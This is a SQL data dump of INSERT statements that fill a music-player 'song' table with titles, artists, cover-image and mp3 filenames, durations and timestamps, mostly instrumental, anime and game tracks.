INSERT INTO `song` VALUES (36, 'See You Again (Violin Cover)', 'Robert Mendoza', '', 'FEF0B030689BD8DBE5683970F9608ECF_1250670441.jpg', 'FEF0B030689BD8DBE5683970F9608ECF_Robert Mendoza - See You Again (Violin Cover).mp3', 0, 0, 0, 218, '2018-08-24 12:31:08', '2018-08-24 12:31:08');
INSERT INTO `song` VALUES (37, 'EXEC COSMOFLIPS', 'KOKIA', '', 'B6E5E4BF991A89FFA79B14EFD0A8D156_-1833129861.jpg', 'B6E5E4BF991A89FFA79B14EFD0A8D156_KOKIA - EXEC COSMOFLIPS.mp3', 0, 0, 0, 217, '2018-08-24 12:33:20', '2018-08-24 12:33:20');
INSERT INTO `song` VALUES (38, 'Traveling Light', 'Joel Hanson', '', '19780BC2765241E2484B81AD57BE8993_-139806057.jpg', '19780BC2765241E2484B81AD57BE8993_Joel Hanson - Traveling Light.mp3', 0, 0, 0, 209, '2018-08-24 12:35:09', '2018-08-24 12:35:09');
INSERT INTO `song` VALUES (39, 'Dragonfly Keeper', 'Phildel', '', 'BB9AE1531F7D89D44EE1A441350954CA_-162377284.jpg', 'BB9AE1531F7D89D44EE1A441350954CA_Phildel - Dragonfly Keeper.mp3', 0, 0, 0, 130, '2018-08-24 12:36:37', '2018-08-24 12:36:37');
INSERT INTO `song` VALUES (40, 'The Musty Scent of Fresh Pâté 《巫师3》', 'Percival Schuttenbach', '', '7DFE971B96A58AB9B4C6FBB1CD2C7A0F_-1935415289.jpg', '7DFE971B96A58AB9B4C6FBB1CD2C7A0F_Percival Schuttenbach,Przemysław Laszczyk - The Musty Scent of Fresh Pâté.mp3', 0, 0, 0, 141, '2018-08-24 12:39:49', '2018-08-24 12:39:49');
INSERT INTO `song` VALUES (41, 'Glorious Morning游戏《战争进化史》/《米拉奇战记》配乐', 'Waterflame', '', '765131B2A50F2AE1BBC4F2D0CBD6CDFD_1273532572.jpg', '765131B2A50F2AE1BBC4F2D0CBD6CDFD_Waterflame - Glorious Morning.mp3', 0, 0, 0, 163, '2018-08-24 12:41:06', '2018-08-24 12:41:06');
INSERT INTO `song` VALUES (42, 'The Slopes of the Blessure《巫师3》', 'Piotr Musial', '', '42923F2BC911C228862F7FDB2035B890_-1935415289.jpg', '42923F2BC911C228862F7FDB2035B890_Piotr Musial - The Slopes of the Blessure.mp3', 0, 0, 0, 242, '2018-08-24 12:43:00', '2018-08-24 12:43:00');
INSERT INTO `song` VALUES (43, 'My Songs Know What You Did in the Dark (Light Em Up) [String ', 'Vitamin String Quartet', '', '1C20AE3B7A8CA4526213AFB42E1580DE_156066352.jpg', '1C20AE3B7A8CA4526213AFB42E1580DE_Vitamin String Quartet - My Songs Know What You Did in the Dark (Light Em Up) [String.mp3', 0, 0, 0, 189, '2018-08-24 12:44:37', '2018-08-24 12:44:37');
INSERT INTO `song` VALUES (44, 'Empire Of Angels', 'Two Steps From Hell', '', '7ABA588172EBA831089957DDC406DF51_272645281.jpg', '7ABA588172EBA831089957DDC406DF51_Two Steps From Hell - Empire Of Angels.mp3', 0, 0, 0, 315, '2018-08-24 12:46:28', '2018-08-24 12:46:28');
INSERT INTO `song` VALUES (45, 'Roundtable Rival', 'Lindsey Stirling', '', 'ED29D79B90B54D5A25A0256F5DAD6ABD_-1810012291.jpg', 'ED29D79B90B54D5A25A0256F5DAD6ABD_Lindsey Stirling - Roundtable Rival.mp3', 0, 0, 0, 203, '2018-08-24 12:47:50', '2018-08-24 12:47:50');
INSERT INTO `song` VALUES (46, 'For The Win ', 'Two Steps From Hell', '', '6E7D6C060975269382480768FB152110_-1554497447.jpg', '6E7D6C060975269382480768FB152110_Two Steps From Hell - For The Win.mp3', 0, 0, 0, 131, '2018-08-24 12:50:41', '2018-08-24 12:50:41');
INSERT INTO `song` VALUES (47, 'The Moon Represents My Heart', 'Kenny G', '', 'AA5E2950EAE848208E4E8D38D0F72D12_735279475.jpg', 'AA5E2950EAE848208E4E8D38D0F72D12_Kenny G - The Moon Represents My Heart.mp3', 0, 0, 0, 215, '2018-08-24 12:51:57', '2018-08-24 12:51:57');
INSERT INTO `song` VALUES (48, 'アイロニ ', '4円', '', 'F645CCDDDD3E36FDA0AC40C43BF86038_1898872781.jpg', 'F645CCDDDD3E36FDA0AC40C43BF86038_4円 - アイロニ.mp3', 0, 0, 0, 251, '2018-08-24 12:52:53', '2018-08-24 12:52:53');
INSERT INTO `song` VALUES (49, '夢灯籠,动画电影《你的名字。》OP', 'RADWIMPS', '', '03D33478F358DC8D544367F541802521_764910471.jpg', '03D33478F358DC8D544367F541802521_RADWIMPS - 夢灯籠.mp3', 0, 0, 0, 132, '2018-08-24 12:54:49', '2018-08-24 12:54:49');
INSERT INTO `song` VALUES (50, 'The Right Path', 'Thomas Greenberg', '', 'F8493BD7BD0AB097CC0CE129E6400EF7_1946327538.jpg', 'F8493BD7BD0AB097CC0CE129E6400EF7_Thomas Greenberg - The Right Path.mp3', 0, 0, 0, 148, '2018-08-24 12:57:12', '2018-08-24 12:57:12');
INSERT INTO `song` VALUES (51, 'What Are You Waiting For?', 'Nickelback', '', '9715B6B046EB47393ACE4AA7F431AE30_-1398143320.jpg', '9715B6B046EB47393ACE4AA7F431AE30_Nickelback - What Are You Waiting For？.mp3', 0, 0, 0, 220, '2018-08-24 12:58:32', '2018-08-24 12:58:32');
INSERT INTO `song` VALUES (52, 'Astronaut', 'Simple Plan', '', '83646B19329BB51A336D70F85AF6306E_809285913.jpg', '83646B19329BB51A336D70F85AF6306E_Simple Plan - Astronaut.mp3', 0, 0, 0, 221, '2018-08-24 13:00:21', '2018-08-24 13:00:21');
INSERT INTO `song` VALUES (53, 'Good Time ', 'Alex Goot', '', 'C40B7B42226C65BF1DF9C109E90DA6ED_364477548.jpg', 'C40B7B42226C65BF1DF9C109E90DA6ED_Alex Goot,Against the Current - Good Time.mp3', 0, 0, 0, 170, '2018-08-24 13:03:56', '2018-08-24 13:03:56');
INSERT INTO `song` VALUES (54, 'Out of Breath ', 'Jared Lee', '', '09880F0192F3DA1C3F6BAB0E22117EDC_1831665210.jpg', '09880F0192F3DA1C3F6BAB0E22117EDC_Jared Lee - Out of Breath.mp3', 0, 0, 0, 206, '2018-08-24 13:05:47', '2018-08-24 13:05:47');
INSERT INTO `song` VALUES (55, 'Beautiful In White (Demo)', 'Westlife', '', 'C7DD39C631C83DF5D66BDAD592C59027_1587200431.jpg', 'C7DD39C631C83DF5D66BDAD592C59027_Westlife - Beautiful In White (Demo).mp3', 0, 0, 0, 232, '2018-08-24 13:07:34', '2018-08-24 13:07:34');
INSERT INTO `song` VALUES (56, '君の知らない物語,TVアニメ「化物語」EDテーマ', 'Supercell', '', '69AB0EFF523AFF48E959E8E29E85554B_189516196.jpg', '69AB0EFF523AFF48E959E8E29E85554B_Supercell - 君の知らない物語.mp3', 0, 0, 0, 341, '2018-08-24 13:09:22', '2018-08-24 13:09:22');
INSERT INTO `song` VALUES (57, 'In Between The Lines ', 'Tyrone Wells', '', '796409E53B945C6834751AE3EF946CFC_1771943092.jpg', '796409E53B945C6834751AE3EF946CFC_Tyrone Wells - In Between The Lines.mp3', 0, 0, 0, 232, '2018-08-24 13:11:09', '2018-08-24 13:11:09');
INSERT INTO `song` VALUES (58, 'コクハクワープ', 'BPM15Q', '', '5382EDEEAF117E1E5CF0018F90310E2B_1165512884.jpg', '5382EDEEAF117E1E5CF0018F90310E2B_BPM15Q - コクハクワープ.mp3', 0, 0, 0, 206, '2018-08-24 13:12:59', '2018-08-24 13:12:59');
INSERT INTO `song` VALUES (59, '桃源恋歌 ', 'GARNiDELiA', '', '950BCEA8F71D102E93B89EC8D15EDBF3_-243739793.jpg', '950BCEA8F71D102E93B89EC8D15EDBF3_GARNiDELiA - 桃源恋歌.mp3', 0, 0, 0, 232, '2018-08-24 13:14:36', '2018-08-24 13:14:36');
INSERT INTO `song` VALUES (60, 'Freesia  TV动画《樱花任务》片尾曲 / TVアニメ「サクラクエスト」EDテー', '(K)NoW_NAME', '', '0C2CD063990857F4C7965EE55D9DD52E_1335005465.jpg', '0C2CD063990857F4C7965EE55D9DD52E_(K)NoW_NAME - Freesia.mp3', 0, 0, 0, 249, '2018-08-24 13:16:20', '2018-08-24 13:16:20');
INSERT INTO `song` VALUES (61, 'On My Own ', 'Ashes Remain', '', 'EC53D374168B6A04DEABBEC17801F489_1968085383.jpg', 'EC53D374168B6A04DEABBEC17801F489_Ashes Remain - On My Own.mp3', 0, 0, 0, 173, '2018-08-24 13:17:56', '2018-08-24 13:17:56');
INSERT INTO `song` VALUES (62, '7 Years  ', 'Madilyn Bailey', '', '3097C7E86F5B84A6A26F515BDE14F710_1797383775.jpg', '3097C7E86F5B84A6A26F515BDE14F710_Madilyn Bailey,Josh Evans - 7 Years.mp3', 0, 0, 0, 153, '2018-08-24 13:19:08', '2018-08-24 13:19:08');
INSERT INTO `song` VALUES (63, 'Glad You Came ', 'Boyce Avenue', '', 'EBE75A9551E4587B92568479E304EE5D_-15141256.jpg', 'EBE75A9551E4587B92568479E304EE5D_Boyce Avenue - Glad You Came.mp3', 0, 0, 0, 196, '2018-08-24 13:24:35', '2018-08-24 13:24:35');
INSERT INTO `song` VALUES (64, 'ロミオとシンデレラ', '花たん', '', '7BB9DA639287D4AB0981657B968C93DA_1352440724.jpg', '7BB9DA639287D4AB0981657B968C93DA_花たん - ロミオとシンデレラ.mp3', 0, 0, 0, 279, '2018-08-24 13:26:05', '2018-08-24 13:26:05');
INSERT INTO `song` VALUES (65, 'Soldier ', 'Fleurie', '', 'BC11C21694540B7AFB0939E39A21630A_903810065.jpg', 'BC11C21694540B7AFB0939E39A21630A_Fleurie - Soldier.mp3', 0, 0, 0, 225, '2018-08-24 13:27:11', '2018-08-24 13:27:11');
INSERT INTO `song` VALUES (66, 'River (Original Mix)', 'Axero', '', '23E8E28BF24761CE1BBF0FD409938857_14695122.jpg', '23E8E28BF24761CE1BBF0FD409938857_Axero - River (Original Mix).mp3', 0, 0, 0, 224, '2018-08-24 13:28:43', '2018-08-24 13:28:43');
INSERT INTO `song` VALUES (67, 'Sitting Next To You', 'Mokoa', '', '95E6EAE25430E63FDE7372A00BB6F480_2119304293.jpg', '95E6EAE25430E63FDE7372A00BB6F480_Mokoa - Sitting Next To You.mp3', 0, 0, 0, 223, '2018-08-24 13:30:52', '2018-08-24 13:30:52');
INSERT INTO `song` VALUES (68, '恋爱サーキュレーション,TV动画《化物语》OP4 / TVアニメ「化物語」OP4テ', '花澤香菜', '', '1F0260D897FF55341CC0A57913977A7B_-1140913936.jpg', '1F0260D897FF55341CC0A57913977A7B_花澤香菜 - 恋爱サーキュレーション.mp3', 0, 0, 0, 254, '2018-08-24 13:32:57', '2018-08-24 13:32:57');
INSERT INTO `song` VALUES (69, 'SAIKA ', 'RABPIT', '', 'D9511A1C5D1F39BBA23895690F9B6995_1806796267.jpg', 'D9511A1C5D1F39BBA23895690F9B6995_RABPIT - SAIKA.mp3', 0, 0, 0, 272, '2018-08-24 13:34:46', '2018-08-24 13:34:46');
INSERT INTO `song` VALUES (70, 'EuroDancer ', 'Klave', '', '0C52A35D695D476405D087EA1CE8C776_-2140234733.jpg', '0C52A35D695D476405D087EA1CE8C776_Klave - EuroDancer.mp3', 0, 0, 0, 210, '2018-08-24 13:35:50', '2018-08-24 13:35:50');
INSERT INTO `song` VALUES (71, 'A Story You Won\'t Believe 《巫师3》', 'Marcin Przybyłowicz', '', '28783667C0383F28829C6864B270100F_-279046889.jpg', '28783667C0383F28829C6864B270100F_Marcin Przybyłowicz - A Story You Won\'t Believe.mp3', 0, 0, 0, 98, '2018-08-24 13:37:28', '2018-08-24 13:37:28');
INSERT INTO `song` VALUES (72, 'Spirits ', 'KOKIA', '', 'F342A210D4A3F8C0E121ED86543B69A9_1447304680.jpg', 'F342A210D4A3F8C0E121ED86543B69A9_KOKIA - Spirits.mp3', 0, 0, 0, 297, '2018-08-24 13:39:29', '2018-08-24 13:39:29');
INSERT INTO `song` VALUES (73, 'Energy Drink ', 'Virtual Riot', '', 'E994BFA4B070D441DEFE8D63074BC6F7_2121933112.jpg', 'E994BFA4B070D441DEFE8D63074BC6F7_Virtual Riot - Energy Drink.mp3', 0, 0, 0, 304, '2018-08-24 13:40:31', '2018-08-24 13:40:31');
INSERT INTO `song` VALUES (74, '深海少女 (Live)', '圈9', '', '562C474822434BA100EC7F3F3E64A124_1925030134.jpg', '562C474822434BA100EC7F3F3E64A124_圈9 - 深海少女 (Live).mp3', 0, 0, 0, 261, '2018-08-24 13:42:53', '2018-08-24 13:42:53');
INSERT INTO `song` VALUES (75, 'Last One Standing ', 'Simple Plan', '', '301D3F5C46DD2A0A55B840D0A85362D7_809285913.jpg', '301D3F5C46DD2A0A55B840D0A85362D7_Simple Plan - Last One Standing.mp3', 0, 0, 0, 207, '2018-08-24 13:44:45', '2018-08-24 13:44:45');
INSERT INTO `song` VALUES (76, 'A Hero Will Rise', 'Future World Music', '', '80A5CB2CB8E32F55B51F44B551D31B86_1051935244.jpg', '80A5CB2CB8E32F55B51F44B551D31B86_Future World Music - A Hero Will Rise.mp3', 0, 0, 0, 232, '2018-08-24 13:46:45', '2018-08-24 13:46:45');
INSERT INTO `song` VALUES (77, 'black bullet TV动画《漆黑的子弹》片头曲 / TVアニメ「ブラック・ブレット」', 'fripSide', '', '7C0222C5A8F8AE87D9C6911C89126A23_625120628.jpg', '7C0222C5A8F8AE87D9C6911C89126A23_fripSide - black bullet.mp3', 0, 0, 0, 262, '2018-08-24 13:48:23', '2018-08-24 13:48:23');
INSERT INTO `song` VALUES (78, '光るならTV动画《四月是你的谎言》OP1 / TVアニメ「四月は君の嘘」OP1', 'Goose house', '', 'E42E1A624B76736D4C68C755287A8EB2_-760306624.jpg', 'E42E1A624B76736D4C68C755287A8EB2_Goose house - 光るなら.mp3', 0, 0, 0, 254, '2018-08-24 13:51:14', '2018-08-24 13:51:14');
INSERT INTO `song` VALUES (79, '心做し ', '花たん', '', '52F9A95BCAA115E09F705D820593F483_402360274.jpg', '52F9A95BCAA115E09F705D820593F483_花たん - 心做し.mp3', 0, 0, 0, 269, '2018-08-24 13:52:14', '2018-08-24 13:52:14');
INSERT INTO `song` VALUES (80, 'いつもこの場所で', '彩音', '', '8EF8004F2564392C91FBFCCCFB76F78D_-370063849.jpg', '8EF8004F2564392C91FBFCCCFB76F78D_彩音 - いつもこの場所で.mp3', 0, 0, 0, 321, '2018-08-24 14:12:04', '2018-08-24 14:12:04');
INSERT INTO `song` VALUES (81, 'Counting Stars ', 'Simply Three', '', 'DEF2B62139A3BDCD3D44809EEACC5153_1898282060.jpg', 'DEF2B62139A3BDCD3D44809EEACC5153_Simply Three - Counting Stars.mp3', 0, 0, 0, 235, '2018-08-24 14:13:32', '2018-08-24 14:13:32');
INSERT INTO `song` VALUES (82, 'I Just Wanna Run', 'Kait Weston', '', '91E4BF14B67A7BB75223CD0B066DACCA_1692267140.jpg', '91E4BF14B67A7BB75223CD0B066DACCA_Kait Weston - I Just Wanna Run.mp3', 0, 0, 0, 189, '2018-08-24 14:14:51', '2018-08-24 14:14:51');
INSERT INTO `song` VALUES (83, 'コネクト - 双声道版', '小緣', '', 'DEF1D125AF79C0A7F006D396FE1D76EF_402360274.jpg', 'DEF1D125AF79C0A7F006D396FE1D76EF_小緣 - コネクト - 双声道版.mp3', 0, 0, 0, 271, '2018-08-24 14:15:59', '2018-08-24 14:15:59');
INSERT INTO `song` VALUES (84, 'crossing field ', 'LiSA', '', '446EF0529C56BFE01BAE2F3F7F555BED_-8129120.jpg', '446EF0529C56BFE01BAE2F3F7F555BED_LiSA - crossing field.mp3', 0, 0, 0, 251, '2018-08-24 14:17:00', '2018-08-24 14:17:00');
INSERT INTO `song` VALUES (85, 'Escape', 'Dripice', '', 'D17856107ED52DF9DD24B818BB5124F4_-988072244.jpg', 'D17856107ED52DF9DD24B818BB5124F4_Dripice - Escape.mp3', 0, 0, 0, 183, '2018-08-24 14:18:00', '2018-08-24 14:18:00');
INSERT INTO `song` VALUES (86, '宿敌 ', '光宗信吉', '', '078EE30E507A9A317C2CAA04FD020598_2112355719.jpg', '078EE30E507A9A317C2CAA04FD020598_光宗信吉 - 宿敌.mp3', 0, 0, 0, 138, '2018-08-24 14:19:15', '2018-08-24 14:19:15');
INSERT INTO `song` VALUES (87, 'サムライハート(Some Like It Hot!!)', 'SPYAIR', '', 'B0EC784765219B201D4A957E1017EFBD_-1818582117.jpg', 'B0EC784765219B201D4A957E1017EFBD_SPYAIR - サムライハート(Some Like It Hot!!).mp3', 0, 0, 0, 190, '2018-08-24 14:20:30', '2018-08-24 14:20:30');
INSERT INTO `song` VALUES (88, 'Hacking to the Gate', 'いとうかなこ', '', '245B5508E8FD570F651127626D76C2AB_-1465335642.jpg', '245B5508E8FD570F651127626D76C2AB_いとうかなこ - Hacking to the Gate.mp3', 0, 0, 0, 256, '2018-08-24 14:22:20', '2018-08-24 14:22:20');
INSERT INTO `song` VALUES (89, '炼狱、极昼', 'V.A', '', 'A8936C3DA967CB8C43FC4B8D1472FA20_-1583711673.jpg', 'A8936C3DA967CB8C43FC4B8D1472FA20_V.A. - 炼狱、极昼.mp3', 0, 0, 0, 81, '2018-08-24 14:24:13', '2018-08-24 14:24:13');
INSERT INTO `song` VALUES (90, 'ツナ覚醒', '佐橋俊彦', '', '31C80D365B6C32D523F1F08E5428A061_402360274.jpg', '31C80D365B6C32D523F1F08E5428A061_佐橋俊彦 - ツナ覚醒.mp3', 0, 0, 0, 98, '2018-08-24 14:25:22', '2018-08-24 14:25:22');
INSERT INTO `song` VALUES (91, '緋色の空 ', '川田まみ', '', '015B5D7A0051DF7DE2E5F7F89C3BA8FC_-881704851.jpg', '015B5D7A0051DF7DE2E5F7F89C3BA8FC_川田まみ - 緋色の空.mp3', 0, 0, 0, 256, '2018-08-24 14:26:06', '2018-08-24 14:26:06');
INSERT INTO `song` VALUES (92, 'Intro', 'The xx', '', '41F5675034A03D6F2045F9A5EF37EB05_1136843025.jpg', '41F5675034A03D6F2045F9A5EF37EB05_The xx - Intro.mp3', 0, 0, 0, 128, '2018-08-24 14:27:31', '2018-08-24 14:27:31');
INSERT INTO `song` VALUES (93, 'PneumaticTokyo', 'EnV', '', '945FB8758E670F29CF561B4562740806_-1900201219.jpg', '945FB8758E670F29CF561B4562740806_EnV - PneumaticTokyo.mp3', 0, 0, 0, 228, '2018-08-24 14:29:38', '2018-08-24 14:29:38');
INSERT INTO `song` VALUES (94, 'River Flows In You (Single MG Mix) - remix', 'Jasper Forks', '', '6993B05975A608316B652AB358FCF32B_-230226469.jpg', '6993B05975A608316B652AB358FCF32B_Jasper Forks - River Flows In You (Single MG Mix) - remix.mp3', 0, 0, 0, 236, '2018-08-24 14:31:25', '2018-08-24 14:31:25');
INSERT INTO `song` VALUES (95, 'Last Of The Wild', 'Nightwish', '', 'D7C61DD7729CE64EB6D94557E0939188_24068971.jpg', 'D7C61DD7729CE64EB6D94557E0939188_Nightwish - Last Of The Wilds.mp3', 0, 0, 0, 341, '2018-08-24 14:32:09', '2018-08-24 14:32:09');
INSERT INTO `song` VALUES (96, 'only my railgun  ', 'fripSide', '', '476586E80E6D473E47F2A53233FB669C_1437406009.jpg', '476586E80E6D473E47F2A53233FB669C_fripSide - only my railgun.mp3', 0, 0, 0, 257, '2018-08-24 14:33:03', '2018-08-24 14:33:03');
INSERT INTO `song` VALUES (97, 'Juste une photo de toi', 'Matt Pokora', '', '0D52A44D9E6866E0E559D55D1FE5BAA2_-1369063131.jpg', '0D52A44D9E6866E0E559D55D1FE5BAA2_Matt Pokora - Juste une photo de toi.mp3', 0, 0, 0, 231, '2018-08-24 14:34:03', '2018-08-24 14:34:03');
INSERT INTO `song` VALUES (98, 'Love Story', 'Various Artists', '', '572B2E26217293149E507B89403AD584_402360274.jpg', '572B2E26217293149E507B89403AD584_Various Artists - Love Story.mp3', 0, 0, 0, 235, '2018-08-24 14:35:37', '2018-08-24 14:35:37');
INSERT INTO `song` VALUES (99, 'Masked Heroes', 'Vexento', '', '0003C03188B79CA821EDC12F0512BEB6_1403977878.jpg', '0003C03188B79CA821EDC12F0512BEB6_Vexento - Masked Heroes.mp3', 0, 0, 0, 211, '2018-08-24 14:37:11', '2018-08-24 14:37:11');
INSERT INTO `song` VALUES (100, 'El Dorado Dubstep (Remix) - remix', 'Two Steps From Hell', '', 'E52EFDD2DCC4A4CEA88F42405C820095_-238839201.jpg', 'E52EFDD2DCC4A4CEA88F42405C820095_Two Steps From Hell - El Dorado Dubstep (Remix) - remix.mp3', 0, 0, 0, 186, '2018-08-24 14:38:17', '2018-08-24 14:38:17');
INSERT INTO `song` VALUES (101, 'The Saltwater Room', 'Owl City', '', 'F9671311687B969B01D9F71EC94337FF_-468605825.jpg', 'F9671311687B969B01D9F71EC94337FF_Owl City,Breanne Düren - The Saltwater Room.mp3', 0, 0, 0, 296, '2018-08-24 14:45:01', '2018-08-24 14:45:01');
INSERT INTO `song` VALUES (102, 'Valder Fields ', 'Tamas Wells', '', 'E7919ECEA3D6E9A58445442F49338149_-691148680.jpg', 'E7919ECEA3D6E9A58445442F49338149_Tamas Wells - Valder Fields.mp3', 0, 0, 0, 159, '2018-08-24 14:46:51', '2018-08-24 14:46:51');
INSERT INTO `song` VALUES (103, 'アイロニ', '鹿乃', '', '24B75F4F6D8EEFC4CE67526644EB8965_1781113000.jpg', '24B75F4F6D8EEFC4CE67526644EB8965_鹿乃 - アイロニ.mp3', 0, 0, 0, 250, '2018-08-24 14:48:30', '2018-08-24 14:48:30');
INSERT INTO `song` VALUES (104, 'Fade', 'Alan Walker', '', '483C844ABD633BE372E508988C418E30_-804765147.jpg', '483C844ABD633BE372E508988C418E30_Alan Walker - Fade.mp3', 0, 0, 0, 262, '2018-08-24 14:50:48', '2018-08-24 14:50:48');
INSERT INTO `song` VALUES (105, 'ISI ', 'Duca', '', 'BA6E2B350B23E9CA005D3725F0743C51_374191514.jpg', 'BA6E2B350B23E9CA005D3725F0743C51_Duca - ISI.mp3', 0, 0, 0, 301, '2018-08-24 14:51:54', '2018-08-24 14:51:54');
INSERT INTO `song` VALUES (106, 'Blumenkranz', 'Cyua', '', '17F218336CE39138C236D0FDFA0B9683_1448617447.jpg', '17F218336CE39138C236D0FDFA0B9683_Cyua - Blumenkranz.mp3', 0, 0, 0, 259, '2018-08-24 14:52:55', '2018-08-24 14:52:55');
INSERT INTO `song` VALUES (107, 'Victory', 'Two Steps From Hell', '', '67F5B2A2B874AFC11D858F592C897C1A_-1704180039.jpg', '67F5B2A2B874AFC11D858F592C897C1A_Two Steps From Hell - Victory.mp3', 0, 0, 0, 320, '2018-08-24 14:54:25', '2018-08-24 14:54:25');
INSERT INTO `song` VALUES (108, 'Stronger ', 'Kelly Clarkson', '', '77BF91D00BA93B56A5AF3C274089E813_-1643880722.jpg', '77BF91D00BA93B56A5AF3C274089E813_Kelly Clarkson - Stronger.mp3', 0, 0, 0, 221, '2018-08-24 14:55:27', '2018-08-24 14:55:27');
INSERT INTO `song` VALUES (109, 'El Dorado', 'Two Steps From Hell', '', 'CF6962B099FC0EDB3EA410A78EDF4778_-1554497447.jpg', 'CF6962B099FC0EDB3EA410A78EDF4778_Two Steps From Hell - El Dorado.mp3', 0, 0, 0, 254, '2018-08-24 14:57:04', '2018-08-24 14:57:04');
INSERT INTO `song` VALUES (110, 'When We Stand Together', 'Nickelback', '', '9D6E6222B196DA7DAC8DE550E67B16D6_-1841340089.jpg', '9D6E6222B196DA7DAC8DE550E67B16D6_Nickelback - When We Stand Together.mp3', 0, 0, 0, 191, '2018-08-24 15:00:37', '2018-08-24 15:00:37');
INSERT INTO `song` VALUES (111, 'Rags To Rings ', 'Mark Petrie', '', '5A8E7A3571A6823B3146855B09E35D00_-376239447.jpg', '5A8E7A3571A6823B3146855B09E35D00_Mark Petrie,Danny McCarthy - Rags To Rings.mp3', 0, 0, 0, 148, '2018-08-24 15:01:30', '2018-08-24 15:01:30');
INSERT INTO `song` VALUES (112, 'Life', 'Tobu', '', 'CDA77AE5DBC7C1386F02B588D926958D_1575691818.jpg', 'CDA77AE5DBC7C1386F02B588D926958D_Tobu - Life.mp3', 0, 0, 0, 204, '2018-08-24 15:03:07', '2018-08-24 15:03:07');
INSERT INTO `song` VALUES (113, 'ビードロ模様', 'やなぎなぎ', '', 'C24F49F988FE61A3133FF1B03FE1094A_-1397730099.jpg', 'C24F49F988FE61A3133FF1B03FE1094A_やなぎなぎ - ビードロ模様.mp3', 0, 0, 0, 292, '2018-08-24 15:05:14', '2018-08-24 15:05:14');
INSERT INTO `song` VALUES (114, 'Horizon ', 'Janji', '', 'A09FC3D12D753A417264C6F34567225D_550405428.jpg', 'A09FC3D12D753A417264C6F34567225D_Janji - Horizon.mp3', 0, 0, 0, 197, '2018-08-24 15:06:10', '2018-08-24 15:06:10');
INSERT INTO `song` VALUES (115, 'only my railgun', '花たん', '', '17DB66B16D04518A72C518CA95A74190_-1216711231.jpg', '17DB66B16D04518A72C518CA95A74190_花たん - only my railgun.mp3', 0, 0, 0, 300, '2018-08-24 15:06:59', '2018-08-24 15:06:59');
INSERT INTO `song` VALUES (116, 'ろりこんでよかった～', 'ちぃむdmp☆', '', '28CA2213D22885A3D4EAFD60CD6B047C_-673025865.jpg', '28CA2213D22885A3D4EAFD60CD6B047C_ちぃむdmp☆ - ろりこんでよかった～.mp3', 0, 0, 0, 208, '2018-08-24 15:08:22', '2018-08-24 15:08:22');
INSERT INTO `song` VALUES (117, '白金ディスコ  ', '井口裕香', '', '562387564F06F2B2EE18337A5AC928FA_-1069275323.jpg', '562387564F06F2B2EE18337A5AC928FA_井口裕香 - 白金ディスコ.mp3', 0, 0, 0, 257, '2018-08-24 15:09:43', '2018-08-24 15:09:43');
INSERT INTO `song` VALUES (118, 'Aphrodite ', 'S.E.N.S', '', '2C4F11783FE23BA4D5C59CA6A7A32CCA_1814043257.jpg', '2C4F11783FE23BA4D5C59CA6A7A32CCA_S.E.N.S. - Aphrodite.mp3', 0, 0, 0, 237, '2018-08-24 15:11:20', '2018-08-24 15:11:20');
INSERT INTO `song` VALUES (119, 'Alice Maestera ', 'Alstroemeria Records', '', '392BB6EC54E98AE755DE0045139B3811_-915638707.jpg', '392BB6EC54E98AE755DE0045139B3811_Alstroemeria Records - Alice Maestera.mp3', 0, 0, 0, 367, '2018-08-24 15:12:04', '2018-08-24 15:12:04');
INSERT INTO `song` VALUES (120, 'Crying in the Rain ', 'Don Williams', '', '4EB559C6EA0E35DDB50AEE74137ABE75_-440874751.jpg', '4EB559C6EA0E35DDB50AEE74137ABE75_Don Williams - Crying in the Rain.mp3', 0, 0, 0, 183, '2018-08-24 15:13:11', '2018-08-24 15:13:11');
INSERT INTO `song` VALUES (121, 'Beauty and a Beat  ', 'Alex Goot', '', '389481AA095289925643C637BD1CF7CF_1866503771.jpg', '389481AA095289925643C637BD1CF7CF_Alex Goot - Beauty and a Beat.mp3', 0, 0, 0, 205, '2018-08-24 15:14:54', '2018-08-24 15:14:54');
INSERT INTO `song` VALUES (122, 'Waves ', 'Axero', '', '6CF79E632572E73F969A5429CCC131F6_-1374049312.jpg', '6CF79E632572E73F969A5429CCC131F6_Axero - Waves.mp3', 0, 0, 0, 266, '2018-08-24 15:16:24', '2018-08-24 15:16:24');
INSERT INTO `song` VALUES (123, 'Breath and Life ', 'Audio Machine', '', '5B95694D4962CF136361B1F1994C94EF_-1746870963.jpg', '5B95694D4962CF136361B1F1994C94EF_Audio Machine - Breath and Life.mp3', 0, 0, 0, 111, '2018-08-24 15:17:16', '2018-08-24 15:17:16');
INSERT INTO `song` VALUES (124, 'The Way', 'Florian Bur', '', '78C9BEC0D9A382A273F669958FAEDFE7_-501333588.jpg', '78C9BEC0D9A382A273F669958FAEDFE7_Florian Bur - The Way.mp3', 0, 0, 0, 135, '2018-08-24 15:18:17', '2018-08-24 15:18:17');
INSERT INTO `song` VALUES (125, 'NEXT TO YOU', 'Ken Arai', '', 'FA3217AFA41D9B27123E8B6386B97449_1926094732.jpg', 'FA3217AFA41D9B27123E8B6386B97449_Ken Arai - NEXT TO YOU.mp3', 0, 0, 0, 225, '2018-08-24 15:19:46', '2018-08-24 15:19:46');
INSERT INTO `song` VALUES (126, 'Sunshine', 'MONKEY MAJIK', '', 'CD2DFEE2085CC8872D86C9CA24E1D6BB_-487994818.jpg', 'CD2DFEE2085CC8872D86C9CA24E1D6BB_MONKEY MAJIK - Sunshine.mp3', 0, 0, 0, 239, '2018-08-24 15:20:22', '2018-08-24 15:20:22');
INSERT INTO `song` VALUES (127, '世界は恋に落ちている -acoustic version', 'かぴ', '', '0BA9D1D68B79FC52DE94F82578DD9A89_1513036843.jpg', '0BA9D1D68B79FC52DE94F82578DD9A89_かぴ - 世界は恋に落ちている -acoustic version-.mp3', 0, 0, 0, 340, '2018-08-24 15:22:18', '2018-08-24 15:22:18');
INSERT INTO `song` VALUES (128, 'Alejandro', 'Vitamin String Quartet', '', '8662A41C0536FD77A19800F4743E6DBA_1446065005.jpg', '8662A41C0536FD77A19800F4743E6DBA_Vitamin String Quartet - Alejandro.mp3', 0, 0, 0, 196, '2018-08-24 15:23:13', '2018-08-24 15:23:13');
INSERT INTO `song` VALUES (129, 'Bad Romance ', 'Vitamin String Quartet', '', '073B518BD9B4378EC93E24A8ECC06907_1446065005.jpg', '073B518BD9B4378EC93E24A8ECC06907_Vitamin String Quartet - Bad Romance.mp3', 0, 0, 0, 250, '2018-08-24 15:24:44', '2018-08-24 15:24:44');
